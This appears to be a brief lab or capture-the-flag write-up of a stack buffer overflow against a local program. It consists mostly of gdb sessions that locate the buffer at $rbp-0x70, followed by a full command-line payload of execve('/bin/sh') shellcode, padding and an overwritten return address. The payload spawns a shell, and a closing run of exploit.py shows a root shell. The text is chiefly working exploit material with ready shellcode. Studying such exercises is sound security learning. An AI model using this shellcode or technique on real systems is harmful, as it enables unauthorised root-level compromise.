# How it works
0x0000000000000bae <+39>:	lea    -0x70(%rbp),%rax

- 112 + 14 to the stack == 126

(gdb) break main
Breakpoint 1 at 0x555555554b8b

(gdb) run $(python -c 'print "A"*120')
Breakpoint 1, 0x0000555555554b8b in main ()

(gdb) print $rbp - 0x70
$1 = (void *) 0x7fffffffe090

(gdb) run $(python -c 'print "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05" + "A"*90 + "\x7f\xff\xff\xff\xe0\x90"[::-1]')

The program being debugged has been started already.

Breakpoint 1, 0x0000555555554b8b in main ()
(gdb) c
Continuing.
H1�H�//bin/shH�SH��PWH���;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�����
-------[ end of note data ]-------
process 27222 is executing new program: /bin/dash
Error in re-setting breakpoint 1: Function "main" not defined.
# 

- We use $rbp - 0x70 as the return address in exploit.py

# How to use exploit
root@kali:~# python exploit.py 
- [DEBUG] found a 10 byte note for user id 0
- -------[ end of note data ]-------
- process 7588 is executing new program: /bin/dash
- ~# whoami
- root
